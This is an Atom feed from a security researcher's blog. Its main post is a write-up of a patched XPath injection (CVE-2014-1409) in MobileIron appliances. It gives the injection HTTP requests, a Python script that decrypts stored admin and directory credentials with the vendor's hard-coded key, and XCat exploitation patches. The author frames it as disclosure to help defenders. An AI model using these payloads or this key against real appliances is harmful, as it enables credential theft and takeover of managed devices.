<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>NextGen$'s blog</title><link href="/" rel="alternate"></link><link href="http://florent.daigniere.com/feeds/blog.atom.xml" rel="self"></link><id>/</id><updated>2014-06-23T11:06:00+01:00</updated><entry><title>CVE-2014-1409 or the sad tale of an XPath injection affecting mobileiron products</title><link href="/posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/" rel="alternate"></link><updated>2014-06-23T11:06:00+01:00</updated><author><name>Florent Daigni√®re</name></author><id>tag:,2014-06-23:posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/</id><summary type="html">&lt;p&gt;Following up on my last post about &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injections, I will document part of the process we went through to exploit &lt;a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt"&gt;CVE-2014-1409&lt;/a&gt; and hopefully convince a few that this category of bugs is no joke and should be looked for during pentests.&lt;/p&gt;
&lt;p&gt;So, what about it? Well, let me tell you a story. The story of a remote-root which doesn't involve any memory corruption on a very widely used and deployed appliance sold by a security vendor.&lt;/p&gt;
&lt;p&gt;In terms of exploitation methodology, here is what needs doing:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;identify a valid/error pattern (see requests below)&lt;/li&gt;
&lt;li&gt;turn the valid/error pattern into a true/false one (trivial)&lt;/li&gt;
&lt;li&gt;exfiltrate the XML content (see structure of the document below to build an optimized query)&lt;/li&gt;
&lt;li&gt;de-obfuscate the credentials (see below).&lt;/li&gt;
&lt;li&gt;login&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;All of the above has been described in &lt;a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt"&gt;MATTA-2013-004&lt;/a&gt;; The vendor has issued a patch and it was made public on 02-04-14. I feel like releasing more details will help other members of the security community develop signatures for IDSes and plugins for vulnerability scanners.&lt;/p&gt;
&lt;p&gt;The two HTTP requests I use to check whether an appliance is vulnerable are the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;j_spring_security_check&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;
&lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;XXX&lt;/span&gt;
&lt;span class="n"&gt;Referer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;XXX&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jsp&lt;/span&gt;
&lt;span class="n"&gt;Connection&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;close&lt;/span&gt;
&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;urlencoded&lt;/span&gt;
&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;48&lt;/span&gt;

&lt;span class="n"&gt;j_username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;and+concat(&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;)=&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;j_password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;-&amp;gt; 'valid' case: response will be HTTP 302&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;j_spring_security_check&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;
&lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;XXX&lt;/span&gt;
&lt;span class="n"&gt;Referer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;XXX&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jsp&lt;/span&gt;
&lt;span class="n"&gt;Connection&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;close&lt;/span&gt;
&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;urlencoded&lt;/span&gt;
&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;48&lt;/span&gt;

&lt;span class="n"&gt;j_username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;and+concat(&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;=)&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;j_password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;-&amp;gt; 'error' case: response will be HTTP 404&lt;/p&gt;
&lt;p&gt;With the assistance of &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt; and the following &lt;a class="reference external" href="../exploiting-xpath-injection-vulnerabilities-with-xcat/index.html"&gt;patches&lt;/a&gt;, you should be able to download the device's configuration file. It contains the obfuscated credentials you will need to connect to &lt;a class="reference external" href="https://XXX/mics/login.jsp"&gt;https://XXX/mics/login.jsp&lt;/a&gt; as administrator! Keep in mind that you need to set the Referer header for the test vector to work; I have a separate &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt; patch for that too.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;configuration&amp;gt;&amp;lt;identity&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;user&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;principal&amp;gt;&lt;/span&gt;admin&lt;span class="nt"&gt;&amp;lt;/principal&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;password&amp;gt;&lt;/span&gt;base64 encoded obfuscated password&lt;span class="nt"&gt;&amp;lt;/password&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/user&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/identity&amp;gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If the applicance is linked to active-directory (or another LDAP server), it will contain the credentials to connect to it (&amp;lt;directoryUserID&amp;gt; and &amp;lt;directoryPassword&amp;gt;).&lt;/p&gt;
&lt;p&gt;The credentials are obfuscated using encryption and a static key. The following script should get you the plaintext:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c"&gt;#&lt;/span&gt;
&lt;span class="c"&gt;#  MobileIron uses AES-ECB-PKCS1.5 (with a known key)&lt;/span&gt;
&lt;span class="c"&gt;# to store credentials... What a brilliant idea!&lt;/span&gt;
&lt;span class="c"&gt;#&lt;/span&gt;
&lt;span class="c"&gt;# This script is about checking whether the provided&lt;/span&gt;
&lt;span class="c"&gt;# hash is vulnerable to CVE-2013-7286 or not.&lt;/span&gt;
&lt;span class="c"&gt;#&lt;/span&gt;
&lt;span class="c"&gt;# NextGen$ ~ 2013&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;binascii&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;Crypto.Cipher&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
 &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Usage: ./CVE-2013-7286.py &amp;lt;base64encoded blob&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;BS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="n"&gt;unpad&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])]&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="c"&gt;# Generate the master key...&lt;/span&gt;
    &lt;span class="c"&gt;# Yes. It&amp;#39;s not a typo!&lt;/span&gt;
    &lt;span class="n"&gt;phrase&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Hakuna matata what a woderful phrase&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;phrase&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c"&gt;# We only want the 16 first bytes (128bit key, 160bit hash function)&lt;/span&gt;
    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digest&lt;/span&gt;&lt;span class="p"&gt;()[:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;ciphertext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;binascii&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;a2b_base64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MODE_ECB&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;unpad&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;printable&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;VULNERABLE TO CVE-2013-7286&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;NOT &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once logged in as administrator on the device, it's game over. You can remotely deploy apps (and get shells!) on all the attached mobile devices and you can capture the traffic flowing through the device. Moreover, you might be able to reuse the AD credentials elsewhere on the infrastructure... OWA and SSL-VPNs are obvious targets. Overall it's a very difficult compromize to recover from as the defender; a successfull attack leaves no useful log to speak of.&lt;/p&gt;
</summary><category term="exploitation"></category><category term="security"></category><category term="blog"></category></entry><entry><title>Exploiting XPath injection vulnerabilities with XCat</title><link href="/posts/2014/06/exploiting-xpath-injection-vulnerabilities-with-xcat/" rel="alternate"></link><updated>2014-06-21T11:06:00+01:00</updated><author><name>Florent Daigni√®re</name></author><id>tag:,2014-06-21:posts/2014/06/exploiting-xpath-injection-vulnerabilities-with-xcat/</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection bugs are relatively common in web applications, yet it's a vulnerability class ignored by the vast majority of pentesters.&lt;/p&gt;
&lt;p&gt;I think that there is two main reasons for that:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The tooling to exploit this type of vulnerabilities sucks.&lt;/li&gt;
&lt;li&gt;There is very few documented cases of &amp;quot;useful&amp;quot; bugs being exploited&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This blog post will attempt to address the former, by detailing several trivial patches that have been submitted to &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt;, an automated &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection exploitation tool. As you will soon realise, like most pentesting tools, &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt; needs some love... In its current form, it's next to useless.&lt;/p&gt;
&lt;p&gt;Patch number one: should you ever need to exploit a bug where the HTTP-response-code is your oracle, you will need the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;commit 705b58c61efe116694dcfb0c62db9fe0daf1bbda
Author: Florent Daigniere &amp;lt;nextgens@freenetproject.org&amp;gt;
Date:   Sat Jan 18 21:28:20 2014 +0000

    The logic is not quite right; it can be HTTP codes too

&lt;span class="gh"&gt;diff --git a/src/xcat.py b/src/xcat.py&lt;/span&gt;
&lt;span class="gh"&gt;index 21bf950..f57b4e7 100755&lt;/span&gt;
&lt;span class="gd"&gt;--- a/src/xcat.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/src/xcat.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -445,8 +445,8 @@ if __name__ == &amp;quot;__main__&amp;quot;:&lt;/span&gt;

     sys.stderr.write(&amp;quot;XCat version %s\n&amp;quot;%__VERSION__)

&lt;span class="gd"&gt;-    if not any([args.false_keyword, args.true_keyword, args.error_keyword]):&lt;/span&gt;
&lt;span class="gd"&gt;-        sys.stderr.write(&amp;quot;Error: You must supply a false, true or error keywor&lt;/span&gt;
&lt;span class="gi"&gt;+    if not any([args.false_keyword, args.true_keyword, args.error_keyword, arg&lt;/span&gt;
&lt;span class="gi"&gt;+        sys.stderr.write(&amp;quot;Error: You must supply a false, true or error keywor&lt;/span&gt;
         exit()

     if not args.post_argument:
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Patch number two: if the bug's oracle is error based, this will also be useful...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;commit 290e93a1a9a57529e7bc07027a87beca9135f43d
Author: Florent Daigniere &amp;lt;nextgens@freenetproject.org&amp;gt;
Date:   Sat Jan 18 21:28:54 2014 +0000

    Fix the HTTP-error code case

&lt;span class="gh"&gt;diff --git a/src/lib/payloads.py b/src/lib/payloads.py&lt;/span&gt;
&lt;span class="gh"&gt;index 0093c7d..11855c4 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/src/lib/payloads.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/src/lib/payloads.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -91,7 +91,7 @@ class PayloadMaker(object):&lt;/span&gt;

         self._headers = Headers({&amp;quot;User-Agent&amp;quot;:[config.user_agent], &amp;quot;Referer&amp;quot;:[

&lt;span class="gd"&gt;-        if config.error_keyword:&lt;/span&gt;
&lt;span class="gi"&gt;+        if config.error_keyword or config.error_code:&lt;/span&gt;
             self.BASE = string.Template(&amp;quot;&amp;#39; and (if ($payload) then error() els
         else:
             self.BASE = string.Template(&amp;quot;&amp;#39; and $payload and &amp;#39;1&amp;#39;=&amp;#39;1&amp;quot;.replace(&amp;quot;&amp;#39;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I hope these patches will save a few hours to the next poor soul that runs into the same issue as I did.&lt;/p&gt;
&lt;p&gt;See you soon for a follow-up post, where I will try to convince the audience that &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection bugs can mean serious business.&lt;/p&gt;
</summary><category term="security"></category><category term="blog"></category></entry><entry><title>Is SantanderUK compromised?</title><link href="/posts/2014/03/is-santanderuk-compromised/" rel="alternate"></link><updated>2014-03-25T10:10:00+00:00</updated><author><name>Florent Daigni√®re</name></author><id>tag:,2014-03-25:posts/2014/03/is-santanderuk-compromised/</id><summary type="html">&lt;p&gt;This morning I have received a special spam, the kind that warrants a blog post.&lt;/p&gt;
&lt;p&gt;It's interesting for several reasons:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;It has my name in the Subject Header&lt;/li&gt;
&lt;li&gt;It came through an address that I have only given to my bank&lt;/li&gt;
&lt;li&gt;It uses a clever old-school trick to avoid &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Bayesian_spam_filtering"&gt;bayesian filtering&lt;/a&gt; (text hidden with white fonts on a white background)&lt;/li&gt;
&lt;li&gt;It used Microsoft's delivery infrastructure (and therefore didn't have any problems with &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Greylisting"&gt;grey-listing&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;It uses 'sane' headers and no links (which tends to be a red-flag for spams)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a security professional, when I see that type of targeted spam, several questions spring to mind:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Have they sold my details? If so, where did they get my consent from?&lt;/li&gt;
&lt;li&gt;If not, they must have been compromised. What else have they leaked? Do they even know?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I have sent them an email this morning, asking the questions above... and will update this post with their reply.&lt;/p&gt;
&lt;p&gt;For the curious, here is a copy of the &lt;a class="reference external" href="https://gist.github.com/nextgens/9758683"&gt;spam from Santander&lt;/a&gt;.&lt;/p&gt;
</summary><category term="pwned"></category><category term="blog"></category><category term="security"></category><category term="banking"></category><category term="spam"></category></entry><entry><title>Hello world!</title><link href="/posts/2014/03/hello-world/" rel="alternate"></link><updated>2014-03-21T11:06:00+00:00</updated><author><name>Florent Daigni√®re</name></author><id>tag:,2014-03-21:posts/2014/03/hello-world/</id><summary type="html">&lt;p&gt;This is our first post!! A classic&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HELO world!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;See you soon ;)&lt;/p&gt;
</summary><category term="helloworld"></category><category term="blog"></category><category term="first"></category></entry></feed>